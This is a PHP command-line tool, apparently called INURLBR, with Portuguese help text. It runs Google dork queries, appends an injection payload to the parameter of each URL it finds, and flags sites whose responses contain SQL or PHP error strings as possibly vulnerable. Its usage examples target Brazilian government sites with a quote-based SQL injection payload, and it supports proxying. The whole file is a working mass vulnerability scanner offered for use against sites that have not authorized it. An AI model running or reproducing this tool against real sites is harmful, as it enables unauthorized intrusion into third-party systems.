<?php

error_reporting(1);
set_time_limit(0);
//ini_set('memory_limit', '64M');
ini_set('display_errors', 1);
ini_set('max_execution_time', 0);
ini_set('allow_url_fopen', 1);


if (!isset($_SESSION)) {
    session_start();
}

function plus() {
    ob_flush();
    flush();
}

$googleHost = "
,www.google.com.br,www.google.pt,www.google.com.bo,www.google.com.my,www.google.ru
,www.google.co.jp,www.google.com.ar,www.google.es,www.google.it,www.google.co.uk
,www.google.com,www.google.ac,www.google.ad,www.google.ae,www.google.com.af
,www.google.com.ag,www.google.com.ai,www.google.am,www.google.it.ao,www.google.com.ar
,www.google.as,www.google.at,www.google.com.au,www.google.az,www.google.ba,www.google.com.bd
,www.google.be,www.google.bf,www.google.bg,www.google.com.bh,www.google.bi,www.google.bj
,www.google.com.bn,www.google.com.bo,www.google.com.br,www.google.bs,www.google.co.bw
,www.google.com.by,www.google.com.bz,www.google.ca,www.google.com.kh,www.google.cc
,www.google.cd,www.google.cf,www.google.cat,www.google.cg,www.google.ch,www.google.ci
,www.google.co.ck,www.google.cl,www.google.cm,www.google.cn,www.google.com.co,www.google.co.cr
,www.google.com.cu,www.google.cv,www.google.cz,www.google.de,www.google.dj,www.google.dk,www.google.dm
,www.google.com.do,www.google.dz,www.google.com.ec,www.google.ee,www.google.com.eg,www.google.es
,www.google.com.et,www.google.fi,www.google.com.fj,www.google.fm,www.google.fr,www.google.ga
,www.google.ge,www.google.gf,www.google.gg,www.google.com.gh,www.google.com.gi,www.google.gl
,www.google.gm,www.google.gp,www.google.gr,www.google.com.gt,www.google.gy,www.google.com.hk
,www.google.hn,www.google.hr,www.google.ht,www.google.hu,www.google.co.id,www.google.iq
,www.google.ie,www.google.co.il,www.google.im,www.google.co.in,www.google.io,www.google.is
,www.google.it,www.google.je,www.google.com.jm,www.google.jo,www.google.co.jp,www.google.co.ke
,www.google.ki,www.google.kg,www.google.co.kr,www.google.com.kw,www.google.kz,www.google.la
,www.google.com.lb,www.google.com.lc,www.google.li,www.google.lk,www.google.co.ls,www.google.lt
,www.google.lu,www.google.lv,www.google.com.ly,www.google.co.ma,www.google.md,www.google.me
,www.google.mg,www.google.mk,www.google.ml,www.google.mn,www.google.ms,www.google.com.mt
,www.google.mu,www.google.mv,www.google.mw,www.google.com.mx,www.google.com.my,www.google.co.mz
,www.google.com.na,www.google.ne,www.google.com.nf,www.google.com.ng,www.google.com.ni,www.google.nl
,www.google.no,www.google.com.np,www.google.nr,www.google.nu,www.google.co.nz,www.google.com.om
,www.google.com.pa,www.google.com.pe,www.google.com.ph,www.google.com.pk,www.google.pn
,www.google.com.pr,www.google.ps,www.google.pt,www.google.com.py,www.google.com.qa,www.google.ro
,www.google.rs,www.google.ru,www.google.rw,www.google.com.sa,www.google.com.sb,www.google.sc
,www.google.se,www.google.com.sg,www.google.sh,www.google.si,www.google.sk,www.google.com.sl
,www.google.sn,www.google.sm,www.google.so,www.google.st,www.google.com.sv,www.google.td
,www.google.tg,www.google.co.th,www.google.tk,www.google.tl,www.google.tm,www.google.to,www.google.com.tn
,www.google.com.tr,www.google.tt,www.google.com.tw,www.google.co.tz,www.google.com.ua,www.google.co.ug
,www.google.co.uk,www.google.us,www.google.com.uy,www.google.co.uz,www.google.com.vc,www.google.co.ve
,www.google.vg,www.google.co.vi,www.google.com.vn,www.google.vu,www.google.ws,www.google.co.za
,www.google.co.zm,www.google.co.zw";
$googleHost = explode(",", trim($googleHost));




################################################################################################################################################################
#MENU AJUDA#####################################################################
if (isset($argv[1]) && $argv[1] == "ajuda") {
    system("command clear");
    $menu = '----------------------------------------------------------------------------------------------------------------------------
     _       _ _   _ ____    _    
    / \     | | | | |  _ \  / \   
   / _ \ _  | | | | | | | |/ _ \  
  / ___ \ |_| | |_| | |_| / ___ \ 
 /_/   \_\___/ \___/|____/_/   \_\ ';
    $menu .= "\n\033[06;42m[ SCANNER INURLBR 1.0 / CONSOLE ]\033[0m \n";
    $menu.= "----------------------------------------------------------------------------------------------------------------------------\r\n
    *  SCANNER INURLBR     1.0
    *  PHP Version         5.4.7
    *  php5-curl           LIB
    *  cURL support	enabled
    *  cURL Information	7.24.0
    *  Apache              2.4
    *  allow_url_fopen =   On
    *  Motor de busca      GOOGLE
    *  Permissão            Leitura & Escrita 
    *  BUSCA POSSÍVEIS VULNERABILIDADES
    *  SQLI(MySQL,MS ACCESS,Microsoft SQL Server,ORACLE,POSTGRESQL) OU ERROS DE PROGRAMAÇÃO.
    *  OPÇÕES PARA SETAR PROXY.
    *  MUDAR O MOTOR DE BUSCA GOOGLE 202 DISPONÍVEIS.
    *  SETAR EXPLOIT.
    *  PERSONALIZAR PROCURA DE ERROS DENTRO DE CADA URL ENCONTRADA.
    *  GRUPO GOOGLEINURL BRASIL - PESQUISA AVANÇADA.
    *  fb.com/GoogleINURL
    *  twitter.com/GoogleINURL
    *  blog.inurl.com.br\n
    
    --host='www.google.com.br'
    --dork='sua dork'
    --arquivo='seusResultados.txt'
    --tipoerro='1 ou 2'
    --exploit='O que vai ser injetado no final de cada url' 
    --achar='Funciona com Tipoerro 2 para procurar strings personalizadas em cada URL'       
    --ipproxy='IP PROXY EX: 172.16.0.150'        
    --porta='PORTA do proxy'
    
     O PARÂMETRO --tipoerro tem duas opções:
     1 - O Scanner vai procurar erros padrões do script SQLI(MySQL,MS ACCESS,Microsoft SQL Server,ORACLE,POSTGRESQL) OU ERROS DE PROGRAMAÇÃO.
         O mesmo vinculado com seu EXPLOIT que pode ser deixado vazio --exploit='' o exploit sempre será usado no final das urls,Padrão básico 
	 sqlinjection.
     2 - Opção para personalizar sua execução onde é habilitado o parâmetro --achar='',Achar funciona para procurar sua definição dentro das urls encontradas.
         Ex[1]: --achar='WordPress' isso vai procurar a palavra WordPress em todas urls encontradas pelo scanner.
         Ex[2]: --tipoerro='2' --exploit='wp-login.php'  --achar='WordPress'\n\r";        
  
    $menu.= "\n\r\033[1;37m----------------------------------------------------------------------------------------------------------------------------\033[0m \n";
    $menu.= "php botConsole.php \033[01;33m--host=\033[0m'www.google.com.br' \033[01;33m--dork=\033[0m'site:.gov.br inurl:php id' \033[01;33m--arquivo=\033[0m'resultado.txt' \033[01;33m--tipoerro=\033[0m'1' \033[01;33m--exploit=\033[0m'--´0x27;' \r\n";
    $menu.= "php botConsole.php \033[01;33m--host=\033[0m'www.google.com.br' \033[01;33m--dork=\033[0m'site:.gov.br inurl:php id' \033[01;33m--arquivo=\033[0m'resultado.txt' \033[01;33m--tipoerro=\033[0m'2' \033[01;33m--exploit=\033[0m'/admin/index.php' \033[01;33m--achar=\033[0m'version 4.1'\r\n";
    $menu.= "php botConsole.php \033[01;33m--host=\033[0m'www.google.com.br' \033[01;33m--dork=\033[0m'site:.gov.br inurl:php id' \033[01;33m--arquivo=\033[0m'resultado.txt' \033[01;33m--tipoerro=\033[0m'2' \033[01;33m--exploit=\033[0m'/admin/index.php' \033[01;33m--achar=\033[0m'version 4.1' \033[01;33m--ipproxy=\033[0m'172.16.0.150' \033[01;33m--porta=\033[0m'8080'\r\n";
    $menu.= "php botConsole.php \033[01;33majuda\033[0m\n";
    $menu.= "php botConsole.php \033[01;33mhosts\033[0m #Lista de hosts do google.\n";
    $menu.= "\033[1;37m----------------------------------------------------------------------------------------------------------------------------\033[0m \n";
    echo $menu;
    exit();
}

if (isset($argv[1]) && $argv[1] == "hosts") {
    system("command clear");
    $menu = '----------------------------------------------------------------------------------------------------------------------------
  _   _  ___  ____ _____ ____     ____  ___   ___   ____ _     _____ 
 | | | |/ _ \/ ___|_   _/ ___|   / ___|/ _ \ / _ \ / ___| |   | ____|
 | |_| | | | \___ \ | | \___ \  | |  _| | | | | | | |  _| |   |  _|  
 |  _  | |_| |___) || |  ___) | | |_| | |_| | |_| | |_| | |___| |___ 
 |_| |_|\___/|____/ |_| |____/   \____|\___/ \___/ \____|_____|_____|';
    $menu .= "\n \033[01;13m\033[06;42m\033[01;13m[ SCANNER INURLBR 1.0 / CONSOLE ]\033[0m \n";
    echo $menu.= "----------------------------------------------------------------------------------------------------------------------------\r\n";

    foreach ($googleHost as $key => $value) {
        echo (isset($value) && !empty($value)) ? "\033[02;31m// \033[0m{$value}" : NULL;
    }

    echo "\r\nTOTAL DE HOSTS...:\033[01;33m" . count($googleHost) . "\033[0m\r\n";
    exit();
}

################################################################################################################################################################
#CONFIGURAR#####################################################################
$config[] = array();
$config['host'] = validar($_SERVER['argv'], 1, 'host');
$config['dork'] = urlencode(validar($_SERVER['argv'], 2, 'dork'));
$config['arquivo'] = validar($_SERVER['argv'], 3, 'arquivo');
$config['tipoerro'] = validar($_SERVER['argv'], 4, 'tipoerro');
$config['exploit'] = (isset($_SERVER['argv'][5]) && !empty($_SERVER['argv'][5])) ? validar($_SERVER['argv'], 5, 'exploit') : NULL;
$config['achar'] = (isset($_SERVER['argv'][6]) && !empty($_SERVER['argv'][6]) && isset($config['tipoerro']) && $config['tipoerro'] == '2') ? validar($_SERVER['argv'], 6, 'achar') : NULL;
$config['ipProxy'] = (isset($_SERVER['argv'][7]) && !empty($_SERVER['argv'][7])) ? validar($_SERVER['argv'], 7, 'ipproxy') : NULL;
$config['porta'] = (isset($_SERVER['argv'][8]) && !empty($_SERVER['argv'][8])) ? validar($_SERVER['argv'], 8, 'porta') : NULL;

$config['url'] = "/search?q={$config['dork']}&num=1900&btnG=Search";
$config['port'] = 80;
$config['host'] = trim($config['host']);
$packet = "GET {$config['url']} HTTP/1.0\r\n";
$packet.="Host: {$config['host']}\r\n";
$packet.="Connection: Close\r\n\r\n";

$_SESSION['config'] = $config;

################################################################################################################################################################
#FORMATAÇÃO DE ARGUMENTOS#######################################################

function argumentos($argv, $campo) {
    $_ARG = array();
    foreach ($argv as $arg) {
        if (ereg('--[a-zA-Z0-9]*=.*', $arg)) {
            $str = split("=", $arg);
            $arg = '';
            $key = str_replace("--", '', $str[0]);
            for ($i = 1; $i < count($str); $i++) {
                $arg .= $str[$i];
            }
            $_ARG[$key] = $arg;
        } elseif (ereg('-[a-zA-Z0-9]', $arg)) {
            $arg = str_replace("-", '', $arg);
            $_ARG[$arg] = 'true';
        }
    }
    return $_ARG[$campo];
}

################################################################################################################################################################
#VALIDAÇÃO DE ARGUMENTOS########################################################

function validar($argv, $id, $campo) {

    if (isset($argv[$id]) && !empty($argv[$id]) && ereg('--[a-zA-Z0-9]*=.*', $argv[$id])) {

        $validacao = argumentos($argv, $campo);
    } else {
        echo "\nVerifique o parâmetro..:{$campo}\n";
        exit();
    }
    return $validacao;
}

################################################################################################################################################################
#ENVIAR INFORMAÇÕES PARA GOOGLE#################################################

function eviarPacote($packet, $config) {

    if (isset($config['ipProxy'])) {
        $ock = fsockopen($config['ipProxy'], $config['porta']);
        if (!$ock) {
            echo "Proxy não responde {$config['ipProxy']} : {$config['porta']}\r\n";
            die;
        }
    } else {

        $ock = fsockopen(gethostbyname($config['host']), $config['port']);
        if (!$ock) {
            echo "Host não responde {$config['host']} : {$config['port']}\r\n";
            die;
        }
    }

    fputs($ock, $packet);
    $buffer = NULL;
    while (!feof($ock)) {
        $buffer.=fgets($ock);
    }
    fclose($ock);
    return($buffer);
}

################################################################################################################################################################
#REQUEST PARA CAPTURA DE URL#################################################

function infoserver($url_) {
    plus();
    $c = curl_init();
    curl_setopt($c, CURLOPT_URL, $url_);
    curl_setopt($c, CURLOPT_USERAGENT, 'Mozilla/5.' . date('s') . '(Windows; U; Windows NT 6.' . date('s') . '; en-US; rv:' . date('s') . date('s') . '.1.2) Gecko/' . date('sysdsms') . date('s') . ' Firefox/3.' . date('s') . '.2 GTB5');
    curl_setopt($c, CURLOPT_HEADER, 1);
    curl_setopt($c, CURLOPT_NOBODY, 0);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($c, CURLOPT_FRESH_CONNECT, 1);
    curl_setopt($c, CURLOPT_VERBOSE, 0);
    curl_setopt($c, CURLOPT_COOKIEFILE, 'cookie.txt');
    curl_setopt($c, CURLOPT_COOKIEJAR, 'cookie.txt');


    $corpo = curl_exec($c);
    $server = curl_getinfo($c);
    $sys = get_headers($url_);

    if (isset($corpo)) {

        $_SESSION['config']['erroReturn'] = verificaErro($corpo);
        $_SESSION['config']['vull_style'] = (isset($_SESSION['config']['erroReturn']) && !empty($_SESSION['config']['erroReturn'])) ? "\033[1;37m:::[0xPOSSÍVEL 0xVULNERÁVEL]:::\033[06;42m" : "\033[01;30m";
        $_SESSION['config']['resultado_vull'].=(isset($_SESSION['config']['erroReturn']) && !empty($_SESSION['config']['erroReturn'])) ? "|{$url_}" : NULL;
    } else {

        return FALSE;
    }
    plus();
    return $info = "/HTTP_CODE:{$server['http_code']} /IP SERVER:{$server['primary_ip']} /PORTA SERVER:{$server['primary_port']} /WEB SERVER:{$sys['2']}";
}

################################################################################################################################################################
#FILTRO DE URL DO RESULTADO GOOGLE##############################################

function formatarResult($html) {
    plus();
    echo "\033[05;31m0xCarregando...\033[0m\n";
    preg_match_all('#\b((((ht|f)tps?://)|(www|ftp)\.)[a-zA-Z0-9\.\#\@\:%_/\?\=\~\-]+)#i', $html, $match);
    $contUrl = 1;
    $contTotal = 0;
    $match[1] = array_unique($match[1]);
    for ($i = 0; $i < count($match[1]); $i++) {
        if (isset($match[1][$i]) && !strstr($match[1][$i], "google") && !strstr($match[1][$i], "youtube") && !strstr($match[1][$i], "orkut") && !strstr($match[1][$i], "schema") && !strstr($match[1][$i], "blogger") && !strstr($match[1][$i], "gstatic")) {

            $info = infoserver(gerarErroDB(urldecode($match[1][$i])));
            $url = urldecode($match[1][$i]);
            echo "\r\n\033[10;37m----------------------------------------------------------------------------------------------------------------------------\033[0m\n";
            echo "0x[ \033[02;31m{$contUrl}\033[0m ] - {$_SESSION['config']['vull_style']}{$url}\033[0m\033[1;31m{$_SESSION['config']['exploit']}\033[0m\r\n\033[0;11m{$info}\n\033[0m";
            echo (isset($_SESSION['config']['erroReturn']) && !empty($_SESSION['config']['erroReturn']) ? "\033[1;37m{$_SESSION['config']['erroReturn']}\033[0m\n" : "\033[0m");
            echo "\033[10;37m----------------------------------------------------------------------------------------------------------------------------\033[0m\r\n";
            $contUrl++;
            $contTotal++;
        }
    }
    plus();
    $resultado = (isset($_SESSION['config']['resultado_vull'])) ? $_SESSION['config']['resultado_vull'] : exit();
    $resultado = explode("|", $resultado);
    $contRes = count($resultado) - 1;
    $resultadotxt = NULL;
    $nomeArquivo = "{$_SESSION['config']['arquivo']}";
    $resultadotxt = base64_decode("U0NBTk5FUiBJTlVSTEJSIDEuMCAtIFsgYmxvZy5pbnVybC5jb20uYnIgXQ==") . " /DATA:" . date("d/m/Y H:i:s") . " /DORK: {$_SESSION['config']['dork']}  /EXPLOIT: {$_SESSION['config']['exploit']}\r\nTOTAL VULL:{$contRes}\r\n " . implode("\r\n", $resultado) . "\r\n\r\n";
    $resultado = implode("\r\n", $resultado);
    print_r("\r\nTOTAL DE URL's: {$contTotal}\r\nEXPLOIT USADO: {$_SESSION['config']['exploit']}\r\nDORK: {$_SESSION['config']['dork']}\r\nTOTAL DE POSSÍVEIS VULL: {$contRes}\r\nARQUIVO COM RESULTADO:{$nomeArquivo}\r\nLISTA:\r\n {$resultado}\r\n");

    $_SESSION['config']['resultado_vull'] = NULL;
    $abrirtxt = fopen($nomeArquivo, "a");
    if ($abrirtxt == false) {
        die("\r\nNão foi possível criar o arquivo.");
    }
    $resultadotxt = str_replace("\033[01;31m", '', $resultadotxt);
    $resultadotxt = str_replace("\033[0m", '', $resultadotxt);
    fwrite($abrirtxt, $resultadotxt);
    fclose($abrirtxt);
}

################################################################################################################################################################
#VALIDANDO ERROS DENTRO DO HTML#################################################

function verificaErro($html_) {

    #ERROS BANCO DE DADOS
    if (isset($_SESSION['config']['tipoerro']) && $_SESSION['config']['tipoerro'] == '1') {
        $erro['MYSQL-01'] = 'mysql_';
        $erro['MYSQL-02'] = 'You have an error in your SQL syntax;';
        $erro['MYSQL-03'] = 'Warning: mysql_';
        $erro['MYSQL-04'] = 'function.mysql';
        $erro['MYSQL-05'] = 'MySQL result index';
        $erro['MYSQL-06'] = 'syntax;';
        $erro['MYSQL-07'] = 'MySQL';

        $erro['MICROSOFT-01'] = 'Microsoft JET Database';
        $erro['MICROSOFT-02'] = 'ODBC Microsoft Access Driver';
        $erro['MICROSOFT-03'] = '500 - Internal server error';
        $erro['MICROSOFT-04'] = 'Microsoft OLE DB Provider';
        $erro['MICROSOFT-05'] = 'Unclosed quotes';
        $erro['MICROSOFT-06'] = 'ADODB.Command';
        $erro['MICROSOFT-07'] = 'ADODB.Field error';
        $erro['MICROSOFT-08'] = 'Microsoft VBScript';

        $erro['ORACLE-01'] = 'Microsoft OLE DB Provider for Oracle';
        $erro['ORACLE-02'] = 'ORA-';

        $erro['POSTGRESQL-01'] = 'pg_';
        $erro['POSTGRESQL-02'] = 'Warning: pg_';
        $erro['POSTGRESQL-03'] = 'PostgreSql Error:';

        #ERROS PHP
        $erro['ERROPHP-01'] = 'Warning: include';
        $erro['ERROPHP-02'] = 'Fatal error: include';
        $erro['ERROPHP-03'] = 'Warning: require';
        $erro['ERROPHP-04'] = 'Fatal error: require';
        $erro['ERROPHP-05'] = 'ADODB_Exception';

        #ERROS ASP
        $erro['ERROASP-01'] = 'Version Information: Microsoft .NET Framework';
        $erro['ERROASP-02'] = "Server.Execute Error";

        #ERROS INDEFINIDOS
        $erro['INDEFINIDO-01'] = 'SQL';
        $erro['INDEFINIDO-02'] = 'Fatal error';
        $erro['INDEFINIDO-03'] = 'Warning';
    } else {

        $erro['ERRRO-PERSONALIZADO'] = $_SESSION['config']['achar'];
    }
    foreach ($erro as $campo => $valor) {

        if (validaBD($html_, $erro[$campo], $campo)) {
            return("Tipo de erro: {$campo}  -  ERRO: {$erro[$campo]}");
        }
    }
}

################################################################################################################################################################
#VERIFICAR ERROS DENTRO DO HTML2################################################

function validaBD($html_, $verificar, $bd) {

    return (strstr($html_, $verificar)) ? $bd : null;
}

################################################################################################################################################################
#GERAR URL COM EXPLOIT##########################################################

function gerarErroDB($_url) {

    $_url = explode("=", $_url);
    $get = max(array_keys($_url));
    $get = $_url[$get];
    return implode("=", str_replace($get, $get . ((isset($_SESSION['config']['exploit'])) ? $_SESSION['config']['exploit'] : NULL), $_url));
}

################################################################################################################################################################
#COMEÇANDO SCANNER##############################################################
system("command clear");
$my = '----------------------------------------------------------------------------------------------------------------------------
  ____   ____    _    _   _ _   _ _____ ____            ___ _   _ _   _ ____  _     
 / ___| / ___|  / \  | \ | | \ | | ____|  _ \          |_ _| \ | | | | |  _ \| |    
 \___ \| |     / _ \ |  \| |  \| |  _| | |_) |  _____   | ||  \| | | | | |_) | |    
  ___) | |___ / ___ \| |\  | |\  | |___|  _ <  |_____|  | || |\  | |_| |  _ <| |___ 
 |____/ \____/_/   \_\_| \_|_| \_|_____|_| \_\         |___|_| \_|\___/|_| \_\_____|                                                                       
';
$my .= "\033[06;42m[ SCANNER INURLBR 1.0 / CONSOLE ] \033[0m \n";
$my .= "----------------------------------------------------------------------------------------------------------------------------\r\n";
$my .= "0xHOST GOOGLE........: \033[02;31m{$_SESSION['config']['host']}\033[0m\n";
$my .= "0xDORK...............: \033[02;31m{$_SESSION['config']['dork']}\033[0m\n";
$my .= "0xEXPLOIT............: \033[02;31m{$_SESSION['config']['exploit']}\033[0m\n";
$my .= "0xARQUIVO............: \033[02;31m{$_SESSION['config']['arquivo']}\033[0m\n";
$my .= "0xTIPO DE ERRO.......: \033[02;31m{$_SESSION['config']['tipoerro']}\033[0m\n";
$my .= "0xPROCURAR NO ALVO...: \033[02;31m{$_SESSION['config']['achar']}\033[0m\n";
$my .= "0xIP PROXY...........: \033[02;31m{$_SESSION['config']['ipProxy']}\033[0m\n";
$my .= "0xPORTA..............: \033[02;31m{$_SESSION['config']['porta']}\033[0m\n";
$my .= "----------------------------------------------------------------------------------------------------------------------------\r\n";
$my .= "0xCARREGANDO CONFIGURAÇÕES...\n";
echo urldecode($my);

$html = eviarPacote($packet, $config);
echo formatarResult($html);
unset($_SESSION['config']);
session_destroy();
?>
